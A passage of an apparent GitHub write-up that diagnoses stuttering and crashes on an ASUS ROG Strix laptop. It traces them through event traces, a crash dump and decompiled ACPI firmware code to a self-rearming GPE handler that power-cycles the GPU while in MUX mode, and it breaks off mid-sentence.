href="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFhYTZiM2Y1ODAxZWY1MTI4MTg5YTA5MzQ2ZTE1ZGE3MTY0OTU3MTMwZTA4YTJjY2U5NzI2OGNkOTM5N2FlZjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gc9YtEEcuAnAZ_w5Z0RwXUd641LCoD6BY7W6JP2QyIM"><img width="1673" height="516" alt="61c7abb1-d7aa-4b69-9a88-22cca7352f00" src="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFhYTZiM2Y1ODAxZWY1MTI4MTg5YTA5MzQ2ZTE1ZGE3MTY0OTU3MTMwZTA4YTJjY2U5NzI2OGNkOTM5N2FlZjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gc9YtEEcuAnAZ_w5Z0RwXUd641LCoD6BY7W6JP2QyIM"></a><p>Random interruptions often suggest hardware faults or thermal throttling. A perfectly repeating pattern points to a systemic issue, a timer or a scheduled event baked into the system's logic.</p><p>The raw event data confirms this pattern:</p><div><pre><code>Clock-Time (100ns), Event, Kernel(ms), CPU 134024027290917802, _GPE._L02 started, 13.613820, 0 134024027290927629, _SB...BAT0._STA started, 0.000000, 4 134024027290932512, _GPE._L02 finished, -, 6 </code></pre></div><p>The first event, <code>_GPE._L02</code>, is an interrupt handler that takes <strong>13.6 milliseconds</strong> to execute. For a high-priority interrupt, this is an eternity and is catastrophic for real-time system performance.</p><p>Deeper in the trace, another bizarre behavior emerges; the system repeatedly attempts to power the discrete GPU on and off, even when it's supposed to be permanently active.</p><div><pre><code>Clock-Time, Event, Duration 134024027315051227, _SB.PC00.GFX0._PS0 start, 278&mu;s # GPU Power On 134024027315155404, _SB.PC00.GFX0._DOS start, 894&mu;s # Display Output Switch 134024027330733719, _SB.PC00.GFX0._PS3 start, 1364&mu;s # GPU Power Off [~15 seconds later] 134024027607550064, _SB.PC00.GFX0._PS0 start, 439&mu;s # Power On Again! 134024027607657368, _SB.PC00.GFX0._DOS start, 1079&mu;s # Display Output Switch 134024027623134006, _SB.PC00.GFX0._PS3 start, 394&mu;s # Power Off Again! ... </code></pre></div><h3>Why This Behavior is Fundamentally Incorrect</h3><a href="https://github.com#why-this-behavior-is-fundamentally-incorrect"></a><p>This power cycling is nonsensical because the laptop is configured for a scenario where it is impossible: <strong>The system is in Ultimate Mode (via a MUX switch) with an external display connected.</strong></p><p>In this mode:</p><ul> <li>The discrete NVIDIA GPU (dGPU) is the <strong>only</strong> active graphics processor.</li> <li>The integrated Intel GPU (iGPU) is completely powered down and bypassed.</li> <li>The dGPU is wired directly to the internal and external displays.</li> <li>There is no mechanism for switching between GPUs.</li> </ul><p>Yet, the firmware ignores MUX state nudging the iGPU path (GFX0) and, worse, engaging dGPU cut/notify logic (PEGP/PEPD) every 30-60 seconds. The dGPU in mux mode isn't just "preferred" - it's the ONLY path to the display. There's no fallback, and no alternative. When the firmware arms DGCE (power off), it's attempting something architecturally impossible.</p><p>Most of the time, hardware sanity checks refuse these nonsensical commands, but even failed attempts introduce latency spikes causing audio dropouts, input lag, and accumulating performance degradation. Games freeze mid-session, videos buffer indefinitely, system responsiveness deteriorates until restart.</p><h4>The Catastrophic Edge Case</h4><a href="https://github.com#the-catastrophic-edge-case"></a><p>Sometimes, under specific thermal conditions or race conditions, the power-down actually succeeds. When the firmware manages to power down the GPU that's driving the display, the sequence is predictable and catastrophic:</p><ol> <li><strong>Firmware OFF attempt</strong> - cuts the dgpu path via PEG1.DGCE</li> <li><strong>Hardware complies</strong> - safety checks fail or timing aligns</li> <li><strong>Display signal cuts</strong> - monitors go black</li> <li><strong>User input triggers wake</strong> - mouse/keyboard activity</li> <li><strong>Windows calls <code>PowerOnMonitor()</code></strong> - attempt display recovery</li> <li><strong>NVIDIA driver executes <code>_PS0</code></strong> - GPU power on command</li> <li><strong>GPU enters impossible state</strong> - firmware insists OFF, Windows needs ON</li> <li><strong>Driver thread blocks indefinitely</strong> - waiting for GPU response</li> <li><strong>30-second watchdog expires</strong> - Windows gives up</li> <li><strong>System crashes with BSOD</strong></li> </ol><div><pre><code>5: kd&gt; !analyze -v ******************************************************************************* * * * Bugcheck Analysis * * * ******************************************************************************* WIN32K_POWER_WATCHDOG_TIMEOUT (19c) Win32k did not turn the monitor on in a timely manner. Arguments: Arg1: 0000000000000050, Calling monitor driver to power on. Arg2: ffff8685b1463080, Pointer to the power request worker thread. Arg3: 0000000000000000 Arg4: 0000000000000000 ... STACK_TEXT: fffff685`3a767130 fffff800`94767be0 : 00000000`00000047 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSwapContext+0x76 fffff685`3a767270 fffff800`94726051 : ffff8685`b1463080 00000027`00008b94 fffff685`3a767458 fffff800`00000000 : nt!KiSwapThread+0x6a0 fffff685`3a767340 fffff800`94724ed3 : fffff685`00000000 00000000`00000043 00000000`00000002 0000008a`fbf50968 : nt!KiCommitThreadWait+0x271 fffff685`3a7673e0 fffff800`9471baf2 : fffff685`3a7675d0 02000000`0000001b 00000000`00000000 fffff800`94724500 : nt!KeWaitForSingleObject+0x773 fffff685`3a7674d0 fffff800`9471b7d5 : ffff8685`9cbec810 fffff685`3a7675b8 00000000`00010224 fffff800`00000003 : nt!ExpWaitForFastResource+0x92 fffff685`3a767580 fffff800`9471b49d : 00000000`00000000 ffff8685`9cbec850 ffff8685`b1463080 00000000`00000000 : nt!ExpAcquireFastResourceExclusiveSlow+0x1e5 fffff685`3a767630 fffff800`28faca9b : fffff800`262ee9c8 00000000`00000003 ffff8685`9cbec810 02000000`00000065 : nt!ExAcquireFastResourceExclusive+0x1bd fffff685`3a767690 fffff800`28facbe5 : ffff8685`b31de000 00000000`00000000 ffffd31d`9a05244f 00000000`00000000 : win32kbase!<lambda_63b61c2369133a205197eda5bd671ee7>::<lambda_invoker_cdecl>+0x2b fffff685`3a7676c0 fffff800`28e5f864 : ffffad0c`94d10878 fffff685`3a767769 ffffad0c`94d10830 ffff8685`b31de000 : win32kbase!UserCritInternal::`anonymous namespace'::EnterCritInternalEx+0x4d fffff685`3a7676f0 fffff800`28e5f4ef : 00000000`00000000 00000000`00000000 fffff800`262ee9c8 00000000`00000000 : win32kbase!DrvSetWddmDeviceMonitorPowerState+0x354 fffff685`3a7677d0 fffff800`28e2abab : ffff8685`b31de000 00000000`00000000 ffff8685`b31de000 00000000`00000000 : win32kbase!DrvSetMonitorPowerState+0x2f fffff685`3a767800 fffff800`28ef22fa : 00000000`00000000 fffff685`3a7678d9 00000000`00000001 00000000`00000001 : win32kbase!PowerOnMonitor+0x19b fffff685`3a767870 fffff800`28ef13dd : ffff8685`94a40700 ffff8685`a2eb31d0 00000000`00000001 00000000`00000020 : win32kbase!xxxUserPowerEventCalloutWorker+0xaaa fffff685`3a767940 fffff800`4bab21c2 : ffff8685`b1463080 fffff685`3a767aa0 00000000`00000000 00000000`00000020 : win32kbase!xxxUserPowerCalloutWorker+0x13d fffff685`3a7679c0 fffff800`26217f3a : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kfull!NtUserUserPowerCalloutWorker+0x22 fffff685`3a7679f0 fffff800`94ab8d55 : 00000000`000005bc 00000000`00000104 ffff8685`b1463080 00000000`00000000 : win32k!NtUserUserPowerCalloutWorker+0x2e fffff685`3a767a20 00007ff8`ee71ca24 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25 000000cc`d11ffbc8 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ff8`ee71ca24 ... </lambda_invoker_cdecl></lambda_63b61c2369133a205197eda5bd671ee7></code></pre></div><p>The crash dump confirms the thread is stuck in <code>win32kbase!DrvSetWddmDeviceMonitorPowerState</code>, waiting for the NVIDIA driver to respond. It can't because it's caught between a confused power state, windows wanting to turn on the GPU while the firmware is arming the GPU cut off.</p><h3>Understanding General Purpose Events</h3><a href="https://github.com#understanding-general-purpose-events"></a><p>GPEs are the firmware's mechanism for signaling hardware events to the operating system. They are essentially hardware interrupts that trigger the execution of ACPI code. The trace data points squarely at <code>_GPE._L02</code> as the source of our latency.</p><p>A closer look at the timing reveals a consistent and problematic pattern:</p><div><pre><code>_GPE._L02 Event Analysis from ROG Strix Trace: Event 1 @ Clock 134024027290917802 Duration: 13,613,820 ns (13.61ms) Triggered: Battery and AC adapter status checks Event 2 @ Clock 134024027654496591 Duration: 13,647,255 ns (13.65ms) Triggered: Battery and AC adapter status checks Event 3 @ Clock 134024028048493318 Duration: 13,684,515 ns (13.68ms) Triggered: Battery and AC adapter status checks Interval between events: ~36-39 seconds Consistency: The duration is remarkably stable and the interval is periodic. </code></pre></div><h3>The Correlation</h3><a href="https://github.com#the-correlation"></a><p>Every single time the lengthy <code>_GPE._L02</code> event fires, it triggers the exact same sequence of ACPI method calls.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUyNTFjNDQ0MTAwMmQzMDBiNDM0Y2UxODBkZDkxZjMwOWNkNzMxNDBhMzYxNDE3NzE1MWU1NWMzM2U4ZGY5ZTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.AgDee_1UQGk7ZgGkiOKiDjrE7DvPkW4ALWuPDhvkndQ"><img width="589" height="589" alt="64921999-7614-4706-a5ac-54c39c38fd0b" src="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUyNTFjNDQ0MTAwMmQzMDBiNDM0Y2UxODBkZDkxZjMwOWNkNzMxNDBhMzYxNDE3NzE1MWU1NWMzM2U4ZGY5ZTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.AgDee_1UQGk7ZgGkiOKiDjrE7DvPkW4ALWuPDhvkndQ"></a><p>The pattern is undeniable:</p><ol> <li>A hardware interrupt fires <code>_GPE._L02</code>.</li> <li>The handler executes methods to check battery status.</li> <li>Shortly thereafter, the firmware attempts to change the GPU's power state.</li> <li>The system runs normally for about 30-60 seconds.</li> <li>The cycle repeats.</li> </ol> <h2>Extracting and Decompiling the Firmware Code</h2><a href="https://github.com#extracting-and-decompiling-the-firmware-code"></a><p></p><h3>Getting to the Source</h3><a href="https://github.com#getting-to-the-source"></a><p>To analyze the code responsible for this behavior, we must extract and decompile the ACPI tables provided by the BIOS to the operating system.</p><div><pre><span><span>#</span> Extract all ACPI tables into binary .dat files</span> acpidump -b <span><span>#</span> Output includes:</span> <span><span>#</span> DSDT.dat - The main Differentiated System Description Table</span> <span><span>#</span> SSDT1.dat ... SSDT17.dat - Secondary System Description Tables</span> <span><span>#</span> Decompile the main table into human-readable ACPI Source Language (.dsl)</span> iasl -d DSDT.dsl</pre></div><p>This decompiled ASL provides a direct view into the firmware's executable logic. It is a precise representation of the exact instructions that the ACPI.sys driver is fed by the firmware and executes at the highest privilege level within the Windows kernel. Any logical flaws found in this code are the direct cause of the system's behavior.</p><h3>Finding the GPE Handler</h3><a href="https://github.com#finding-the-gpe-handler"></a><p>Searching the decompiled <code>DSDT.dsl</code> file, we find the definition for our problematic GPE handler:</p><div><pre><span>Scope</span> (<span>_GPE</span>) { <span>Method</span> (<span>_L02</span>, , <span>NotSerialized</span>) <span>// _Lxx: Level-Triggered GPE</span> { \<span>_SB</span>.PC00.LPCB.ECLV () } }</pre></div><p>This code is simple: when the <code>_L02</code> interrupt occurs, it calls a single method, <code>ECLV</code>. The "L" prefix in <code>_L02</code> signifies that this is a <strong>level-triggered</strong> interrupt, meaning it will continue to fire as long as the underlying hardware condition is active. This is a critical detail.</p><h3>The Catastrophic <code>ECLV</code> Implementation</h3><a href="https://github.com#the-catastrophic-eclv-implementation"></a><p>Following the call to <code>ECLV()</code>, we uncover a deeply flawed implementation that is the direct cause of the system-wide stuttering.</p><div><pre><span>Method</span> (ECLV, , <span>NotSerialized</span>) <span>// Starting at line 099244</span> { <span>// Main loop - continues while events exist OR sleep events are pending</span> <span>// AND we haven't exceeded our time budget (TI3S &lt; 0x78)</span> <span>While</span> (((CKEV() != <span>Zero</span>) || (SLEC != <span>Zero</span>)) &amp;&amp; (TI3S &lt; <span>0x78</span>)) { <span>Local1</span> = <span>One</span> <span>While</span> (<span>Local1</span> != <span>Zero</span>) { <span>Local1</span> = GEVT() <span>// Get next event from queue</span> LEVN (<span>Local1</span>) <span>// Process the event</span> TIMC += <span>0x19</span> <span>// Increment time counter by 25</span> <span>// This is where it gets really bad</span> <span>If</span> ((SLEC != <span>Zero</span>) &amp;&amp; (<span>Local1</span> == <span>Zero</span>)) { <span>// No events but sleep events pending</span> <span>If</span> (TIMC == <span>0x19</span>) { <span>Sleep</span> (<span>0x64</span>) <span>// Sleep for 100 milliseconds!!!</span> TIMC = <span>0x64</span> <span>// Set time counter to 100</span> TI3S += <span>0x04</span> <span>// Increment major counter by 4</span> } <span>Else</span> { <span>Sleep</span> (<span>0x19</span>) <span>// Sleep for 25 milliseconds!!!</span> TI3S++ <span>// Increment major counter by 1</span> } } } } <span>// Here's where it gets even worse</span> <span>If</span> (TI3S &gt;= <span>0x78</span>) <span>// If we hit our time budget (120)</span> { TI3S = <span>Zero</span> <span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Force another event to be pending!</span> } } }</pre></div><h3>Breaking Down this monstrosity</h3><a href="https://github.com#breaking-down-this-monstrosity"></a><p>This short block of code violates several fundamental principles of firmware and kernel programming.</p><p><strong>Wtf 1: Sleeping in an Interrupt Context</strong></p><div><pre><span>Sleep</span> (<span>0x64</span>) <span>// 100ms sleep</span> <span>Sleep</span> (<span>0x19</span>) <span>// 25ms sleep</span></pre></div><p>An interrupt handler runs at a very high priority to service hardware requests quickly. The <code>Sleep()</code> function completely halts the execution of the CPU core it is running on (CPU 0 in this case). While CPU 0 is sleeping, it cannot:</p><ul> <li>Process any other hardware interrupts.</li> <li>Allow the kernel to schedule other threads.</li> <li>Update system timers.</li> </ul> <blockquote><p>Clarification: These Sleep() calls live in the ACPI GPE handling path for the GPE L02, these calls get executed at PASSIVE_LEVEL after the SCI/GPE is acknowledged so it's not a raw ISR (because i don't think windows will even allow that) but analyzing this further while the control method runs the GPE stays masked and the ACPI/EC work is serialized. With the Sleep() calls inside that path and the self rearm it seems to have the effect of making ACPI.sys get tied up in long periodic bursts (often on CPU 0) which still have the same effect on the system.</p></blockquote><p><strong>Wtf 2: Time-Sliced Interrupt Processing</strong> The entire loop is designed to run for an extended period, processing events in batches. It's effectively a poorly designed task scheduler running inside an interrupt handler, capable of holding a CPU core hostage for potentially seconds at a time.</p><p><strong>Wtf 3: Self-Rearming Interrupt</strong></p><div><pre><span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Forces all EC event bits on</span> }</pre></div><p>This logic ensures that even if the Embedded Controller's event queue is empty, the code will create a new, artificial event. This guarantees that another interrupt will fire shortly after, creating the perfectly periodic pattern of ACPI spikes observed in the traces.</p><h2>The Event Dispatch System</h2><a href="https://github.com#the-event-dispatch-system"></a><p></p><h3>How Events Route to Actions</h3><a href="https://github.com#how-events-route-to-actions"></a><p>The LEVN() method takes an event and routes it:</p><div><pre><span>Method</span> (LEVN, <span>1</span>, <span>NotSerialized</span>) { <span>If</span> ((<span>Arg0</span> != <span>Zero</span>)) { MBF0 = <span>Arg0</span> P80B = <span>Arg0</span> <span>Local6</span> = <span>Match</span> (LEGA, <span>MEQ</span>, <span>Arg0</span>, <span>MTR</span>, <span>Zero</span>, <span>Zero</span>) <span>If</span> ((<span>Local6</span> != <span>Ones</span>)) { LGPA (<span>Local6</span>) } } } </pre></div><h3>The <code>LGPA</code> Dispatch Table</h3><a href="https://github.com#the-lgpa-dispatch-table"></a><p>The LGPA() method is a giant switch statement handling different events:</p><div><pre><span>Method</span> (LGPA, <span>1</span>, <span>Serialized</span>) <span>// Line 098862</span> { <span>Switch</span> (<span>ToInteger</span> (<span>Arg0</span>)) { <span>Case</span> (<span>Zero</span>) <span>// Most common case - power event</span> { DGD2 () <span>// GPU-related function</span> ^EC0._QA0 () <span>// EC query method</span> PWCG () <span>// Power change - this is our battery polling</span> } <span>Case</span> (<span>0x18</span>) <span>// GPU-specific event</span> { <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notify GPU driver</span> } <span>Case</span> (<span>0x1E</span>) <span>// Another GPU event</span> { <span>Notify</span> (^^PEG1.PEGP, <span>0xD5</span>) <span>// Direct GPU notification</span> ROCT = <span>0x55</span> <span>// Sets flag for follow-up</span> } } }</pre></div><p>This shows a direct link: a GPE fires, and the dispatch logic calls functions related to battery polling and GPU notifications.</p><h2>The Battery Polling Function</h2><a href="https://github.com#the-battery-polling-function"></a><p>The <code>PWCG()</code> method, called by multiple event types, is responsible for polling the battery and AC adapter status.</p><div><pre><span>Method</span> (PWCG, , <span>NotSerialized</span>) { <span>Notify</span> (ADP0, <span>Zero</span>) <span>// Tell OS to check the AC adapter</span> ^BAT0.<span>_BST</span> () <span>// Execute the Battery Status method</span> <span>Notify</span> (BAT0, <span>0x80</span>) <span>// Tell OS the battery status has changed</span> ^BAT0.<span>_BIF</span> () <span>// Execute the Battery Information method </span> <span>Notify</span> (BAT0, <span>0x81</span>) <span>// Tell OS the battery info has changed</span> }</pre></div><p>Which we can see here:</p><a href="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNhOWJhYmRkMDkzY2ExMGVkZjZiOTNjNjhlOGZhNTU5NTAwOGRmZWNlZDBkMTFhMWMzODk0NTQxM2YxZmNhOTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.hUrDEZ1mff7IvoVix4oINjEMnNXlrWsMWQu0tZp5uJc"><img width="1043" height="315" alt="image" src="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNhOWJhYmRkMDkzY2ExMGVkZjZiOTNjNjhlOGZhNTU5NTAwOGRmZWNlZDBkMTFhMWMzODk0NTQxM2YxZmNhOTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.hUrDEZ1mff7IvoVix4oINjEMnNXlrWsMWQu0tZp5uJc"></a><p>Each of these operations requires communication with the Embedded Controller, adding to the workload inside the already-stalled interrupt handler.</p><h3>The GPU Notification System</h3><a href="https://github.com#the-gpu-notification-system"></a><p>The <code>NOD2()</code> method sends notifications to the GPU driver.</p><div><pre><span>Method</span> (NOD2, <span>1</span>, <span>Serialized</span>) { <span>If</span> ((<span>Arg0</span> != DNOT)) { DNOT = <span>Arg0</span> <span>Notify</span> (^^PEG1.PEGP, <span>Arg0</span>) } <span>If</span> ((ROCT == <span>0x55</span>)) { ROCT = <span>Zero</span> <span>Notify</span> (^^PEG1.PEGP, <span>0xD1</span>) <span>// Hardware-Specific</span> } }</pre></div><p>These notifications (<code>0xD1</code>, <code>0xD2</code>, etc.) are hardware-specific signals that tell the NVIDIA driver to re-evaluate its power state, which prompts driver power-state re-evaluation; in traces this surfaces as iGPU GFX0._PSx/_DOS toggles plus dGPU state changes via PEPD._DSM/DGCE.</p><h2>The Mux Mode Confusion: A Firmware with a Split Personality</h2><a href="https://github.com#the-mux-mode-confusion-a-firmware-with-a-split-personality"></a><p>Here's where a simple but catastrophic oversight in the firmware's logic causes system-wide failure. High-end ASUS gaming laptops feature a MUX (Multiplexer) switch, a piece of hardware that lets the user choose between two distinct graphics modes:</p><ol> <li><strong>Optimus Mode:</strong> The power-saving default. The integrated Intel GPU (iGPU) is physically connected to the display. The powerful NVIDIA GPU (dGPU) only renders demanding applications when needed, passing finished frames to the iGPU to be drawn on screen.</li> <li><strong>Ultimate/Mux Mode:</strong> The high-performance mode. The MUX switch physically rewires the display connections, bypassing the iGPU entirely and wiring the NVIDIA dGPU directly to the screen. In this mode, the dGPU is not optional; it is the <strong>only</strong> graphics processor capable of outputting an image.</li> </ol><p>Any firmware managing this hardware <strong>must</strong> be aware of which mode the system is in. Sending a command intended for one GPU to the other is futile and, in some cases, dangerous. Deep within the ACPI code, a hardware status flag named <code>HGMD</code> is used to track this state. To understand the flaw, we first need to decipher what <code>HGMD</code> means, and the firmware itself gives us the key.</p><h4><strong>Decoding the Firmware's Logic with the Brightness Method</strong></h4><a href="https://github.com#decoding-the-firmwares-logic-with-the-brightness-method"></a><p>For screen brightness to work, the command must be sent to the GPU that is physically controlling the display backlight. A command sent to the wrong GPU will simply do nothing. Therefore, the brightness control method (<code>BRTN</code>) <em>must</em> be aware of the MUX switch state to function at all. It is the firmware's own Rosetta Stone.</p><div><pre><span>// Brightness control - CORRECTLY checks for mux mode</span> <span>Method</span> (BRTN, <span>1</span>, <span>Serialized</span>) <span>// Line 034003</span> { <span>If</span> (((DIDX &amp; <span>0x0F0F</span>) == <span>0x0400</span>)) { <span>If</span> (HGMD == <span>0x03</span>) <span>// 0x03 = Ultimate/Mux mode</span> { <span>// In mux mode, notify discrete GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.PEG1.PEGP.EDP1, <span>Arg0</span>) } <span>Else</span> { <span>// In Optimus, notify integrated GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.GFX0.DD1F, <span>Arg0</span>) } } }</pre></div><p>The logic here is flawless and revealing. The code uses the <code>HGMD</code> flag to make a binary decision. If <code>HGMD</code> is <code>0x03</code>, it sends the command to the NVIDIA GPU. If not, it sends it to the Intel GPU. The firmware itself, through this correct implementation, provides the undeniable definition: <strong><code>HGMD == 0x03</code> means the system is in Ultimate/Mux Mode.</strong></p><h4><strong>The Logical Contradiction: Unconditional Power Cycling in a Conditional Hardware State</strong></h4><a href="https://github.com#the-logical-contradiction-unconditional-power-cycling-in-a-conditional-hardware-state"></a><p>This perfect, platform-aware logic is completely abandoned in the critical code paths responsible for power management. The <code>LGPA</code> method, which is called by the stutter-inducing interrupt, dispatches power-related commands to the GPU <em>without ever checking the MUX mode</em>.</p><div><pre><span>// GPU power notification - NO MUX CHECK!</span> <span>Case</span> (<span>0x18</span>) { <span>// This SHOULD have: If (HGMD != 0x03)</span> <span>// But it doesn't, so it runs even in mux mode</span> <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notifies GPU regardless of mode</span> }</pre></div><h3>Another Path to the Same Problem: The Platform Power Management DSM</h3><a href="https://github.com#another-path-to-the-same-problem-the-platform-power-management-dsm"></a><p>This is not a single typo. A second, parallel power management system in the firmware exhibits the exact same flaw. The Platform Extension Plug-in Device (<code>PEPD</code>) is used by Windows to manage system-wide power states, such as turning off displays during modern standby.</p><div><pre><span>Device</span> (PEPD) <span>// Line 071206</span> { <span>Name</span> (<span>_HID</span>, <span>"INT33A1"</span>) <span>// Intel Power Engine Plugin</span> <span>Method</span> (<span>_DSM</span>, <span>4</span>, <span>Serialized</span>) <span>// Device Specific Method</span> { <span>// ... lots of setup code ...</span> <span>// Arg2 == 0x05: "All displays have been turned off"</span> <span>If</span> ((<span>Arg2</span> == <span>0x05</span>)) { <span>// Prepare for aggressive power saving</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DHDW)) { ^^PC00.PEG1.DHDW () <span>// GPU pre-shutdown work</span> ^^PC00.PEG1.DGCE = <span>One</span> <span>// Set "GPU Cut Enable" flag</span> } <span>If</span> (S0ID == <span>One</span>) <span>// If system supports S0 idle</span> { GUAM (<span>One</span>) <span>// Enter low power mode</span> } ^^PC00.DPOF = <span>One</span> <span>// Display power off flag</span> <span>// Tell USB controller about display state</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x05</span>) } } <span>// Arg2 == 0x06: "A 